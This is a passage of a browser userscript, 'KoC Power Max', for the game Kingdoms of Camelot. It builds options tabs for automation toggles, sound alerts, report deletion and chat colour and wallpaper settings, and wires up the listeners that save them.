	t.togOpt ('togTransport', 'Transport');	t.togOpt ('togATransport', 'AutoTransport'); 	t.togOpt ('togscCrafting', 'scCrafting');	t.togOpt ('togANeuzuordnen', 'AutoNeuzuordnen');	t.togOpt ('togNeueNachricht', 'NeueNachricht');	t.togOpt ('togMeineBerichte', 'MeineBerichte');	t.togOpt ('togAllianzBerichte', 'AllianzBerichte');	t.togOpt ('togVerstaerken', 'Verstaerken');		t.togOpt ('togNeuzuordnen', 'Neuzuordnen');	t.togOpt ('togWiederholen', 'Wiederholen');	t.togOpt ('togAutoBau', 'AutoBau');	t.togOpt ('togMakieren', 'Makieren');	t.togOpt ('togHilfe', 'Hilfe');	t.togOpt ('togAutoRefresh', 'AutoRefresh');	t.togOpt ('togscRaidReset', 'scRaidReset');	t.togOpt ('togscAutoTrain', 'scAutoTrain');	t.togOpt ('togscCrest', 'scCrest');	t.togOpt ('togscDF', 'DarkForestButton');	t.togOpt ('togStopSound', 'scStopSound');

	// t.togOpt ('pbscToolbar', 'scToolbar'); <INPUT id=pbscToolbar type=checkbox /> '+culang.ksxbuttler+'
    // t.togOpt ('togChatBold', 'chatbold'); <INPUT type=checkbox id=togChatBold />'+culang.OtogChatBold +'

    } catch (e) {    }
  },

/**********************************************************/
/************ KOC POWER - SUBTABS BOT *****************OK*/
/********************************************************/
showBot : function (){
     var t = Tabs.Options;

    try {
	m = '<DIV style=" max-height:750px;"><TABLE width=100% class=pdxTab cellspacing=0 cellpadding=0>\
	<TR><TD colspan=2><DIV class=pdxStat>'+culang.HkpwrbotS+'</div></tr>\
	<TR><TD width="10"><INPUT id=ptEnableFoodChatWarn type=checkbox /></td><TD>'+culang.Olowfoodwarn1+' \
	<INPUT id=optfoodChatWarnHours type=text size=3 value="'+ Options.foodChatWarnHours +'"> '+culang.Olowfoodwarn2 +' <font color=#FF0000>('+culang.OlowfoodwarnNote +')</td></tr>\
	<TR><TD><INPUT id=pbFairie type=checkbox /></td><TD>'+culang.OpbFairie  +'</td></tr>\
	<TR><TD><INPUT id=pbWideOpt type=checkbox '+ (GlobalOptions.pbWideScreen?'CHECKED ':'') +'/></td><TD>'+culang.OpbWideOpt +' '+ htmlSelector({normal:''+culang.OwideOptnormal+'', wide:''+culang.OwideOptwide +'', ultra:''+culang.OwideOptultra +'',  mega:''+culang.OwideOptmega +'',own:''+culang.OwideOptown+''},GlobalOptions.pbWideScreenStyle,'id=selectScreenMode') +' <font color=#FF0000>('+culang.needRefresh +')</font> - <b>'+culang.OwideOptown+'</b> '+culang.OwideOownsel+'! </td></tr>\
	<TR><TD><INPUT id=pbWatchEnable type=checkbox '+ (GlobalOptions.pbWatchdog?'CHECKED ':'') +'/></td><TD>'+culang.OpbWatchEnable +' <font color=#FF0000>('+culang.alldomains +')</font></td></tr>\
	<TR><TD><INPUT id=pbGoldEnable type=checkbox /></td><TD>'+culang.OpbGoldEnable +' <INPUT id=pbgoldLimit type=text size=2 maxlength=3 \>'+culang.OpbGoldEnable2 +'</td></tr>\
	<TR><TD><INPUT id=HelReq type=checkbox /></td><TD>'+culang.OHelReq +'</td></tr>\
	<TR><TD><INPUT id=PubReq type=checkbox '+ (GlobalOptions.autoPublishGamePopups?'CHECKED ':'') +'/></td><TD>'+culang.OPubRew +' <font color=#FF0000>('+culang.OPubRewNote +')</font></td>\
	<TR><TD></td><TD>'+culang.OHelprivacy+' '+ htmlSelector({0:'----', 80:''+culang.all+'', 50:''+culang.Ofriendsfriends+'', 40:''+culang.Oonlyfriends+'', 10:''+culang.Oonlyme+''},GlobalOptions.autoPublishPrivacySetting,'id=selectprivacymode') +' </td></tr>\
	<TR><TD><INPUT id=DelReq type=checkbox /></td><TD>'+culang.ODelRew +'</td></tr>\
	<TR><TD colspan=2><DIV class=pdxStat>'+culang.Hreports+'</div></tr>\
	<TR><TD><INPUT id=deletetoggle type=checkbox /></td><TD> '+culang.Odeletetoogle +' <span class=boldRed>('+culang.OdeletetoogleNote +')</span></td></tr>\
	<TR><TD><INPUT id=deletes0toggle type=checkbox /></td><TD> '+culang.Odeletes0toggle+' <span class=boldRed>('+culang.Odeletes0toggleNote +')</span></td></tr>\
	<TR><TD><INPUT id=deletes1toggle type=checkbox /></td><TD> '+culang.deletes1toggle +'</td></tr>\
	<TR><TD><INPUT id=deletes2toggle type=checkbox /></td><TD> '+culang.deletes2toggle + '</td></tr>\
	<TR><TD><INPUT id=deletes3toggle type=checkbox /></td><TD> '+culang.deletes3toggle + ' </td></tr>\
	<TR><TD></td><td>'+culang.OdeleteTimer+': <input type=text size=3 id=deletetimer value="'+parseIntNan(Options.DeleteTimer)+'"> '+culang.OdeleteTimer2+'</td></tr>\
	<TR><TD colspan=2><DIV class=pdxStat>'+culang.HSTtrain+' - '+culang.Hsettings+'</div></tr>\
	<TD></td><TD>'+culang.OAutoTrainOptions +' <INPUT id=optAutoTrainMins type=text size=1 value="'+ parseInt(WallTrainOptions.intervalSecs/60) +'"> '+culang.OAutoTrainOptions2+'</td></tr>\
	</table><HR><u>'+culang.impnote+'</u>: '+culang.Onote +'\<br><br>\
           <td colspan="3"><tr><table width="980" border="0" cellspacing="0" cellpadding="0"><tr>\
           <td colspan="3"><center><b><b><a href="http://userscripts.org/scripts/show/114635" target="_blank">KoC Power Max </b><span class="boldRed">Version 1.2.4.1 </span>Powered by KoC Power MulitLang Version 1.2.4 by PDX, Re-edited by Larry W. Harrell </a></b></center></td>\
           <tr><td><center><a href="http://userscripts.org/scripts/show/114635" target="_blank"><br><img src="http://www.lwharrell.com/KOC/images/LWHKOCPwrlogo.png" alt="KoC Power Max Scripts by LWH" width="400" height="78"><a href="http://userscripts.org/scripts/show/114635" target="_blank"><span class="boldRed"><BR>Click here to get latest version... ! <BR><BR><BR></a></span></center></td>\
           </table></div>';

		   
	t.optionsDiv.innerHTML = m;
	if (!parseIntNan(document.getElementById('deletetimer').value) <60) {
	    Options.DeleteTimer = 120;
	    document.getElementById('deletetimer').value = "120";
	}
	document.getElementById('deletetimer').addEventListener ('change', function () {
	  if (parseInt(document.getElementById('deletetimer').value) > 59) {
	    Options.DeleteTimer = document.getElementById('deletetimer').value;
	   } else {
	    Options.DeleteTimer = 120;
	    document.getElementById('deletetimer').value = "120";
	   }
	  saveOptions();
	}, false);
	
	  document.getElementById('optfoodChatWarnHours').addEventListener ('change', function () {
          var fcw = document.getElementById('optfoodChatWarnHours').value;
          if (isNaN(fcw) || fcw<0.01 || fcw>99999){
            document.getElementById('optfoodChatWarnHours').value = Options.foodChatWarnHours;
            return;
          }
          Options.foodChatWarnHours = fcw;
          saveOptions();
        }, false);
	  document.getElementById('selectScreenMode').addEventListener ('change', function(){
         GlobalOptions.pbWideScreenStyle = document.getElementById('selectScreenMode').value;
         GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
		 saveGlobalOptions();
      },false);
	  document.getElementById('selectprivacymode').addEventListener ('change', function(){
         GlobalOptions.autoPublishPrivacySetting = document.getElementById('selectprivacymode').value;
         GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
		 saveGlobalOptions();
      },false);
      document.getElementById('PubReq').addEventListener ('change', function(){
         GlobalOptions.autoPublishGamePopups = document.getElementById('PubReq').checked;
         GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
		  saveGlobalOptions();
      },false);

      document.getElementById('pbWatchEnable').addEventListener ('change', t.e_watchChanged, false);
      document.getElementById('pbWideOpt').addEventListener ('change', t.e_wideChanged, false);

	  document.getElementById('optAutoTrainMins').addEventListener ('change', function () {
				WallTrainOptions.intervalSecs = 60 * document.getElementById('optAutoTrainMins').value;
				saveWallTrainOptions();
	  }, false);

	  t.togOpt ('pbFairie', 'pbKillFairie', FairieKiller.setEnable);
      t.togOpt ('pbGoldEnable', 'pbGoldEnable', CollectGold.setEnable);
      t.togOpt ('ptEnableFoodChatWarn', 'enableFoodChatWarn');         //25mar
      t.togOpt ('HelReq', 'HelpRequest');
      t.togOpt ('DelReq', 'DeleteRequest');      t.togOpt ('deletetoggle', 'DeleteMsg');      t.togOpt ('deletes0toggle', 'DeleteMsgs0');      t.togOpt ('deletes1toggle', 'DeleteMsgs1');	  
	  t.togOpt ('deletes2toggle', 'DeleteMsgs2');
	  t.togOpt ('deletes3toggle', 'DeleteMsgs3');
	  t.changeOpt ('pbgoldLimit', 'pbGoldHappy');
      nHtml.SetSelect(document.getElementById('htmlSelector'),this.options.autoPublishPrivacySetting);
	  
    } catch (e) {    }
  },
/**********************************************************/
/************ KOC POWER - SUBTABS TOOLS **************OK**/
/********************************************************/
  showTools : function (){
  div = document.createElement('div');
	var t = Tabs.Options;
	  try {
	  m = '<DIV style=" max-height:750px;"><TABLE width=100% class=pdxTab cellspacing=0 cellpadding=0>\
			<TR><TD  colspan=2><div class=pdxStat>'+culang.Hkpwrtools+'</div></td></tr>\
			<TR><TD width="10"><INPUT id=ptEnableFoodWarn type=checkbox /></td><TD>\''+culang.OptEnableFoodWarn0+'\''+culang.OptEnableFoodWarn1+'\' '+culang.OptEnableFoodWarn2+' <INPUT id=optFoodHours type=text size=3 value="'+ Options.foodWarnHours +'"> '+culang.OptEnableFoodWarn3+' <SPAN class=boldRed>('+culang.OptEnableFoodWarnNote+')</span></td></tr>\
			<TR><TD colspan=2><span style=\"font-size:10px; color:#555; line-height:18px; \"><font color=#600000><B><u>'+culang.impo+'</u></b></font>: '+culang.OFoodWarnImpNote +'</span></td></tr>\
			<TR><TD colspan=2><div class=pdxStat>'+culang.HkpwrtoolsS+'</div></td></tr>\
			<TR><TD><INPUT  type=checkbox id=ptEnableTowerSoundAlert /></td><TD>'+culang.OSBallianceS+' - '+culang.soundurl+' <INPUT id=togURL2 size=15 type=textbox value="'+ Options.URLson2 +'" /> '+culang.vol+' <INPUT id=togURL2vol size=3 type=textbox value="'+ Options.URLson2vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL2"></td></tr>\
			<TR><TD><INPUT  type=checkbox id=ptEnableTowerSoundAlertWild /></td><TD>'+culang.OSBalliancewildS+' - '+culang.soundurl+' <INPUT id=togURL4 size=15 type=textbox value="'+ Options.URLson4 +'" /> '+culang.vol+' <INPUT id=togURL4vol size=3 type=textbox value="'+ Options.URLson4vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL4"></td></tr>\
			<TR><TD><INPUT type=checkbox id=ptEnableFoodChatAlert /></td><TD>'+culang.OptEnableFoodChatAlert+' - '+culang.soundurl+' <INPUT id=togURL3 size=15 type=textbox value="'+ Options.URLson3 +'" /> '+culang.vol+' <INPUT id=togURL3vol size=3 type=textbox value="'+ Options.URLson3vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL3"></td></tr>\
			<TR><TD><INPUT id=togWhisperOn type=checkbox /></td><TD>'+culang.OtogWhisperOn +' - '+culang.soundurl+' <INPUT id=togURL1 size=15 type=textbox value="'+ Options.URLson1 +'" /> '+culang.vol+' <INPUT id=togURL1vol size=3 type=textbox value="'+ Options.URLson1vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL1"></td></tr>\
			<TR><TD><INPUT id=togOSAattack type=checkbox /></td><TD><b>'+culang.chatcommand+'</b>: '+culang.OSAattackfetch+' - '+culang.soundurl+' <INPUT id=togURL5 size=15 type=textbox value="'+ Options.URLson5 +'" /> '+culang.vol+' <INPUT id=togURL5vol size=3 type=textbox value="'+ Options.URLson5vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL5"> </td></tr>\
			<TR><TD><INPUT id=togOSAhorn type=checkbox /></td><TD><b>'+culang.chatcommand+'</b>: '+culang.OSAhornfetch+' - '+culang.soundurl+' <INPUT id=togURL6 size=15 type=textbox value="'+ Options.URLson6 +'" /> '+culang.vol+' <INPUT id=togURL6vol size=3 type=textbox value="'+ Options.URLson6vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL6"> </td></tr>\
			<TR><TD><INPUT id=togOSAgun type=checkbox /></td><TD><b>'+culang.chatcommand+'</b>: '+culang.OSAgunfetch+' - '+culang.soundurl+'  <INPUT id=togURL7 size=15 type=textbox value="'+ Options.URLson7 +'" /> '+culang.vol+' <INPUT id=togURL7vol size=3 type=textbox value="'+ Options.URLson7vol +'" /> <input type=button value="'+culang.reset+'" id="PDXDefURL7"> </td></tr>\
			<TR><TD colspan=2><span style=\"font-size:10px; color:#555; line-height:18px; \"><font color=#600000><B><u>'+culang.impo+'</u></b></font>: '+culang.OkocpowertoolsSnote +' <a href="http://koc.god-like.org/?p=149" target="_blank">'+culang.STlinklist+'</a><br><B><u>'+culang.impnote+'</u></b>: '+culang.STlinklistnote+'</span></td></tr>\
			<TR><TD colspan=2><DIV class=pdxStat>'+culang.HOptionsTabKoCset+'</div></td></tr>\
			<TR><TD><INPUT id=togshowMightKoCBugFix type=checkbox /></td><TD>'+culang.showFullMight+'</td></tr>\
			<TR><TD><INPUT id=togshowResKoCBugFix type=checkbox /></td><TD>'+culang.showFullRes+'</td></tr>\
			<TR><TD><INPUT id=togAllRpts type=checkbox /></td><TD>'+culang.OtogAllRpts+'</td></tr>\
			<TR><TD><INPUT id=togAllMembers type=checkbox /></td><TD>'+culang.OtogAllMembers+'</td></tr>\
			<TR><TD><INPUT id=togAllowAlter type=checkbox /></td><TD>'+culang.OtogAllowAlter+'</td></tr>\
			<TR><TD><INPUT id=togWarnZero type=checkbox /></td><TD>'+culang.OtogWarnZero+'</td></tr>\
			<TR><TD><INPUT id=togAttackPicker type=checkbox /></td><TD>'+culang.OtogAttackPicker +' <SPAN class=boldRed>('+culang.OtogAttackPickerNote +')</span></td></tr>\
			<TR><TD><INPUT id=togBatRounds type=checkbox /></td><TD>'+culang.OtogBatRounds +'</td></tr>\
			<TR><TD><INPUT id=togAtkDelete type=checkbox /></td><TD>'+culang.OtogAtkDelete +' <SPAN class=boldRed>('+culang.OtogAtkDeleteNote +')</span></td></tr>\
			<TR><TD><INPUT id=togKnightSelect type=checkbox /></td><TD>'+culang.OtogKnightSelect+'</td></tr>\
			<TR><TD><INPUT id=togCoordBox type=checkbox /></td><TD>'+culang.OtogCoordBox +'  <b>(</b>'+culang.OtogCoordBoxNote+'<b>)</b></td></tr>\
			</table><<HR><u>'+culang.impnote+'</u>: '+culang.Onote +'\<br><br>\
           <td colspan="3"><tr><table width="980" border="0" cellspacing="0" cellpadding="0"><tr>\
           <td colspan="3"><center><b><b><a href="http://userscripts.org/scripts/show/114635" target="_blank">KoC Power Max </b><span class="boldRed">Version 1.2.4.1 </span>Powered by KoC Power MulitLang Version 1.2.4 by PDX, Re-edited by Larry W. Harrell </a></b></center></td>\
           <tr><td><center><a href="http://userscripts.org/scripts/show/114635" target="_blank"><br><img src="http://www.lwharrell.com/KOC/images/LWHKOCPwrlogo.png" alt="KoC Power Max Scripts by LWH" width="400" height="78"><a href="http://userscripts.org/scripts/show/114635" target="_blank"><span class="boldRed"><BR>Click here to get latest version... ! <BR><BR><BR></a></span></center></td>\
           </table></div>';

		  
	t.optionsDiv.innerHTML = m;
	
	t.changeOpt ('togURL1', 'URLson1');	t.changeOpt ('togURL1vol', 'URLson1vol');	t.changeOpt ('togURL2', 'URLson2');	t.changeOpt ('togURL2vol', 'URLson2vol');	t.changeOpt ('togURL3', 'URLson3');	t.changeOpt ('togURL3vol', 'URLson3vol');	t.changeOpt ('togURL4', 'URLson4');	t.changeOpt ('togURL4vol', 'URLson4vol');	t.changeOpt ('togURL5', 'URLson5');	t.changeOpt ('togURL5vol', 'URLson5vol');	t.changeOpt ('togURL6', 'URLson6');	t.changeOpt ('togURL6vol', 'URLson6vol');	
	t.changeOpt ('togURL7', 'URLson7');	t.changeOpt ('togURL7vol', 'URLson7vol');	
	t.togOpt ('ptEnableFoodWarn', 'enableFoodWarn');	t.togOpt ('ptEnableTowerSoundAlert', 'enableTowerAlert');	t.togOpt ('ptEnableTowerSoundAlertWild', 'enableTowerAlertWild');	t.togOpt ('ptEnableFoodChatAlert', 'enableFoodChatAlert');
	t.togOpt ('togWhisperOn', 'WhisperOn');	t.togOpt ('togOSAattack', 'OSAattack');	t.togOpt ('togOSAhorn', 'OSAhorn');	t.togOpt ('togOSAgun', 'OSAgun');
	t.togOpt ('togshowMightKoCBugFix', 'showMightKoCBugFix');	t.togOpt ('togshowResKoCBugFix', 'showResKoCBugFix');	
	t.togOpt ('togAllowAlter', 'allowAlterAR');
	t.togOpt ('togAllRpts', 'enhanceARpts', AllianceReports.enable);
	t.togOpt ('togAllMembers', 'enhanceViewMembers', AllianceReports.enable_viewmembers);
	t.togOpt ('togWarnZero', 'fixWarnZero', WarnZeroAttack.setEnable, WarnZeroAttack.isAvailable);
	t.togOpt ('togAttackPicker', 'attackCityPicker', AttackDialog.setEnable, AttackDialog.isCityPickerAvailable);
	t.togOpt ('togBatRounds', 'dispBattleRounds', null, battleReports.isRoundsAvailable);
	t.togOpt ('togKnightSelect', 'fixKnightSelect', AttackDialog.setEnable, AttackDialog.isKnightSelectAvailable);
	t.togOpt ('togCoordBox', 'mapCoordsTop', CoordBox.setEnable, CoordBox.isAvailable);
	t.togOpt ('togAtkDelete', 'reportDeleteButton', null, battleReports.isRoundsAvailable);
	  
	document.getElementById("PDXDefURL7").addEventListener ('click', function () { Options.URLson7 = 'http://koc.god-like.info/gun.mp3'; document.getElementById('togURL7').value='http://koc.god-like.info/gun.mp3'; saveOptions(); }, false);
	document.getElementById("PDXDefURL6").addEventListener ('click', function () { Options.URLson6 = 'http://koc.god-like.info/hupenchaos.mp3'; document.getElementById('togURL6').value='http://koc.god-like.info/hupenchaos.mp3'; saveOptions();	}, false);
	document.getElementById("PDXDefURL5").addEventListener ('click', function () { Options.URLson5 = 'http://koc.god-like.info/war-alarm.mp3'; document.getElementById('togURL5').value='http://koc.god-like.info/war-alarm.mp3'; saveOptions(); }, false);
	document.getElementById("PDXDefURL4").addEventListener ('click', function () { Options.URLson4 = 'http://koc.god-like.info/skyandsand.mp3'; document.getElementById('togURL4').value='http://koc.god-like.info/skyandsand.mp3'; saveOptions(); }, false);
	document.getElementById("PDXDefURL3").addEventListener ('click', function () { Options.URLson3 = 'http://koc.god-like.info/phone.mp3'; document.getElementById('togURL3').value='http://koc.god-like.info/phone.mp3'; saveOptions(); }, false);
	document.getElementById("PDXDefURL2").addEventListener ('click', function () { Options.URLson2 = 'http://koc.god-like.info/sirene.mp3'; document.getElementById('togURL2').value='http://koc.god-like.info/sirene.mp3'; saveOptions(); }, false);
	document.getElementById("PDXDefURL1").addEventListener ('click', function () { Options.URLson1 = 'http://koc.god-like.info/fluestersound.mp3'; document.getElementById('togURL1').value='http://koc.god-like.info/fluestersound.mp3';		saveOptions();	}, false);

	document.getElementById('optFoodHours').addEventListener ('change', function () { var x = document.getElementById('optFoodHours').value; if (isNaN(x) || x<0.01 || x>99999){ document.getElementById('optFoodHours').value = Options.foodWarnHours; return; } Options.foodWarnHours = x; saveOptions();	}, false);
	
    } catch (e) {
	  div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }
  },

/**********************************************************/
/************ KOC POWER - PDX COUNTDOWN ***************OK*/
/********************************************************/
 showPDXxTraStuff : function (){
  div = document.createElement('div');
    var t = Tabs.Options;
      try {
		m = '<DIV style="height:2000px;overflow-y:scroll"><DIV class=pdxStat>'+culang.HpdxXtra+'</div><TR><TD><INPUT id=togUserAvatar type=checkbox /></td><TD>'+culang.ownAvatar+': <INPUT id=togAvaURL size=40 type=textbox value="'+Options.UserAvatarURL+'" /><input type=button value="'+culang.reset+'" id="defAvaURL"/> ('+culang.avatarSize+' 25px x 25px) <BR><i>'+culang.OavatarNote+'</i></td></tr><HR>'+culang.ownAvatarNote+'<HR><u>'+culang.impnote+'</u>: '+culang.Onote +'\<br><br>\<b>STILL WORKING ON....Auto Reinforcement Tab which triggers off of tower alarms to automatically send troops to an alliance city under attack ...</b><br>Any one interested in helping with the coding, please contact me at larry@lwharrell.com!</center><br><br><br><center>\
           <BR><br><object width="640" height="360"><param name="movie" value="http://www.youtube.com/v/rMKTgd2z8uc&hl=en_US&feature=player_embedded&version=3"></param><BR><BR><param name="allowFullScreen" value="true"></param><param name="allowScriptAccess" value="always"></param>\<iframe width="640" height="360" src="http://www.youtube.com/embed/rMKTgd2z8uc" frameborder="0" allowfullscreen></iframe><BR><BR><iframe width="640" height="360" src="http://www.youtube.com/embed/wzh6VKpB6qc" frameborder="0" allowfullscreen></iframe><BR>\
		   <center><BR><iframe width="640" height="360" src="http://www.youtube.com/embed/q-xPK1DEfdk" frameborder="0" allowfullscreen></iframe><BR><center><BR><BR><table width="780" border="0" cellspacing="0" cellpadding="10"><tr>\
           <td colspan="3"><center><a href="http://userscripts.org/scripts/show/114635" target="_blank">KoC Power Max - Version 1.2.2.1) Powered by KoC Power MulitLang Version 1.2.2 by PDX and re-edited by Larry W. Harrell</a></span></td>\
           <tr><td><center><a href="http://userscripts.org/scripts/show/114635" target="_blank"><br><img src="http://www.lwharrell.com/KOC/images/LWHKOCPwrlogo.png" alt="KoC Scripts by LWH" width="300" height="78"><a href="http://userscripts.org/scripts/show/114635" target="_blank"><span class="boldRed"><br> Click here to get latest version...!<br></a></span></center></td>\
           </table></center></div>';
           t.optionsDiv.innerHTML = m;
			
	t.togOpt ('togUserAvatar', 'UserAvatar');
			
	document.getElementById('togAvaURL').addEventListener ('change', function () { Options.UserAvatarURL = document.getElementById('togAvaURL').value; saveOptions(); }, false);
	document.getElementById("defAvaURL").addEventListener ('click', function () { Options.UserAvatarURL = 'http://koc.god-like.info/img/pdx-useravatar.png'; document.getElementById('togAvaURL').value='http://koc.god-like.info/img/pdx-useravatar.png'; saveOptions(); }, false);
	
    } catch (e) {
	  div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }
  },

/**********************************************************/
/************ KOC POWER - PDX THEME OPT ******************/
/********************************************************/
 showLayoutWallpaper : function (){
  div = document.createElement('div');
    var t = Tabs.Options;
      try {
      m = '<DIV style="max-height:750px;"><DIV class=pdxStat>'+culang.Hlaystuff+'</div><table class=pdxTab width="74%" border="0" cellspacing="0" cellpadding="0">\
		<tr><td colspan="3"><u><b>'+culang.chatBGIMG+'</b></u></td><td colspan="3"><b><u>'+culang.chatBGIMGdark+'</u></b></td><td colspan="2"><b><u>'+culang.customColors+'</u></b></td></tr>\
		<tr><td><INPUT type=checkbox id=togChatBGImageGlobal></td><td>'+culang.image+'</td><td ><input type="text" id=togOwnBackGroundGlobal value="'+ Options.OwnBackGroundGlobal +'" size="12" maxlength="200" /></td>		<td><INPUT type=checkbox id=togChatBGImageAlliance></td>		<td>'+culang.image+'</td>		<td ><input   type="text" id=togOwnBackGroundAlliance value="'+ Options.OwnBackGroundAlliance +'" size="12" maxlength="200" /></td>		<td width="188">'+culang.saytoalliancecol+'</td>		<td  width="72"><input style="background:'+Colors.SayToAlliCol+';" type="text" id="togSayToAlliCol" value="'+Colors.SayToAlliCol+'" size="7" maxlength="7" /></td>\		</tr>\
		<tr><td width="20"><INPUT type=checkbox id=togChatBGColorGlobal></td><td width="162">'+culang.colors1+' </td><td ><input style="background:'+Colors.OwnBackgroundColorGlobal+';" type="text" id="togOwnBackgroundColorGlobal" value="'+Colors.OwnBackgroundColorGlobal+'" size="7" maxlength="7" /></td>		<td width="25" ><INPUT type=checkbox id=togChatBGColorAlliance></td>		<td width="142">'+culang.colors1+' </td>		<td width="72"><input style="background:'+Colors.OwnBackgroundColorAlliance+';" type="text" id="togOwnBackgroundColorAlliance" value="'+Options.OwnBackgroundColorAlliance+'" size="7" maxlength="7" /></td><td>'+culang.saytoglobal+'</td>		<td ><input style="background:'+Colors.SayToGlobalCol+';" type="text" id="togSayToGlobalCol" value="'+Colors.SayToGlobalCol+'" size="7" maxlength="7" /></td>\		</tr>\
		<tr><td>&nbsp;</td><td>'+culang.OtogMainFont+'</td><td width="72"><input  style="background:'+Colors.ChatFontColor+';" type="text" id=togChatFontColor value="'+Colors.ChatFontColor+'" size="7" maxlength="7" /></td>		<td colspan="3">&nbsp;</td>		<td>&nbsp;</td>		<td>&nbsp;</td></tr>\
		<tr><td colspan="3"><b><u>'+culang.customWPlight+'</u></b></td><td colspan="3"><b><u>'+culang.customWPdark+'</u></b></td><td>'+culang.chatSetLink+'</td><td > <INPUT  style="background:'+Colors.modCommForumA+';" type=text id=togmodCommForumA value="'+Colors.modCommForumA+'" size=7 maxlength=7></td>\		</tr>\
		<tr><td rowspan="2">&nbsp;</td><td>'+culang.image+'</td><td><input   type="text" id=togownWP value="'+ Options.ownWP +'" size="12" maxlength="200" /></td><td rowspan="2">&nbsp;</td>		<td>'+culang.image+'</td>		<td><input   type="text" id=togownWPdark value="'+ Options.ownWPdark +'" size="12" maxlength="200" /></td>		<td>'+culang.chatSetLinkHover+'</td>		<td > <INPUT style="background:'+Colors.modCommForumAhover+';" type=text id=togmodCommForumAhover value="'+Colors.modCommForumAhover+'" size=7 maxlength=7></td>\		</tr>\
		<tr><td> '+culang.colors1+' </td><td ><input type="text" style="background:'+Colors.MainBody+';" id=togMainBody value="'+Colors.MainBody+'" size="7" maxlength="7" /> </td>		<td>'+culang.colors1+' </td>		<td ><input style="background:'+Colors.MainBodyDark+';" type="text" id=togMainBodyDark value="'+Colors.MainBodyDark+'" size="7" maxlength="7" /></td>		<td>&nbsp;</td>		<td>&nbsp;</td></tr>\
		<tr><td colspan="2">'+culang.OtogMainFont +' </td><td ><input style="background:'+Colors.MainFont+';" type="text" id="togMainFont" value="'+Colors.MainFont+'" size="7" maxlength="7" /></td><td colspan="2">&nbsp;</td>		<td>&nbsp;</td>		<td>'+culang.globalChatLinks+' </td>		<td ><input style="background:'+Colors.ChatLinkColGlobal+';" type="text" id="togChatLinkColGlobal" value="'+Colors.ChatLinkColGlobal+'" size="7" maxlength="7" /></td>\		</tr>\
		<tr><td colspan="6" rowspan="2">&nbsp;</td><td>'+culang.chatContentLinkCol+'</td><td><input style="background:'+Colors.ChatLinkContentColor+';" type="text" id="togChatLinkContentColor" value="'+Colors.ChatLinkContentColor+'" size="7" maxlength="7" /></td>\		</tr>\
		<tr><td>'+culang.allianceChatLinks+' </td><td ><input style="background:'+Colors.ChatLinkColAlly+';" type="text" id="togChatLinkColAlly" value="'+Colors.ChatLinkColAlly+'" size="7" maxlength="7" /></td></tr><tr>		<td colspan="8">&nbsp;</td></tr>\
		<tr><td colspan="3"><b><u>'+culang.setbannerBox+'</u></b></td><td colspan="2"><u><b>'+culang.setQuickInfos+'</b></u></td><td>&nbsp;</td><td colspan="2"><u><b>'+culang.setDeskInfo+'</b></u></td>		</tr>\
		<tr><td colspan="2">'+culang.OtogMainFont+'</td><td ><input  style="background:'+Colors.devCreditsFontCol+';" type="text" id="togdevCreditsFontCol" value="'+Colors.devCreditsFontCol+'" size="7" maxlength="7" /></td>		<td colspan="2">'+culang.OtogMainFont+'</td>		<td ><input style="background:'+Colors.pdxQuickInfoFont+';" type="text" id="togpdxQuickInfoFont" value="'+Colors.pdxQuickInfoFont+'" size="7" maxlength="7" /></td>		<td>'+culang.OtogMainFont+'</td>		<td ><input style="background:'+Colors.pdxDeskInfoFont+';" type="text" id="togpdxDeskInfoFont" value="'+Colors.pdxDeskInfoFont+'" size="7" maxlength="7" /></td>\		</tr>\
		<tr><td colspan="2">'+culang.hyperlinks+'</td><td ><input style="background:'+Colors.devLinkCol+';" type="text" id="togdevLinkCol" value="'+Colors.devLinkCol+'" size="7" maxlength="7" /></td>		<td colspan="2">'+culang.bgimg+'</td>		<td ><input type="text" id="togownWP" value="'+ Options.pdxQuickInfoBG +'" size="12" maxlength="200" /></td>		<td>'+culang.bgimg+'</td>		<td ><input type="text" id="togpdxDeskInfoBG" value="'+ Options.pdxDeskInfoBG +'" size="12" maxlength="200" /></td></tr>\
		<tr><td colspan="2">'+culang.hyperlinkshover+'</td><td ><input style="background:'+Colors.devLinkColhover+';" type="text" id="togdevLinkColhover" value="'+Colors.devLinkColhover+'" size="7" maxlength="7" /></td>		<td colspan="2">&nbsp;</td>		<td>&nbsp;</td>		<td>&nbsp;</td>		<td>&nbsp;</td></tr><tr><td colspan="2">'+culang.bgimg+'</td>		<td ><input type="text" id="togdevBG" value="'+ Options.devBG +'" size="12" maxlength="200" /></td>		<td colspan="2">&nbsp;</td>		<td>&nbsp;</td>		<td>'+culang.fontStats+' </td>		<td ><input style="background:'+Colors.pdxQuickInfoData+';" type="text" id="togpdxQuickInfoData" value="'+Colors.pdxQuickInfoData+'" size="7" maxlength="7" /></td>\		</tr>\
		</table>'+culang.iscomming+' <HR><u>'+culang.impnote+'</u>: '+culang.Onote +'\<br><br>\
           <td colspan="3"><tr><table width="980" border="0" cellspacing="0" cellpadding="0"><tr>\
           <td colspan="3"><center><b><b><a href="http://userscripts.org/scripts/show/114635" target="_blank">KoC Power Max </b><span class="boldRed">Version 1.2.4.1 </span>Powered by KoC Power MulitLang Version 1.2.4 by PDX, Re-edited by Larry W. Harrell </a></b></center></td>\
           <tr><td><center><a href="http://userscripts.org/scripts/show/114635" target="_blank"><br><img src="http://www.lwharrell.com/KOC/images/LWHKOCPwrlogo.png" alt="KoC Power Max Scripts by LWH" width="400" height="78"><a href="http://userscripts.org/scripts/show/114635" target="_blank"><span class="boldRed"><BR>Click here to get latest version... ! <BR><BR><BR></a></span></center></td>\
           </table></div>';

	    
	t.optionsDiv.innerHTML = m;

	t.changeColorLayout ('togpdxQuickInfoData', 'pdxQuickInfoData');
	t.changeColorLayout ('togdevLinkColhover', 'devLinkColhover');
	t.changeColorLayout ('togdevLinkCol', 'devLinkCol');
	t.changeColorLayout ('togpdxDeskInfoFont', 'pdxDeskInfoFont');
	t.changeColorLayout ('togpdxQuickInfoFont', 'pdxQuickInfoFont');
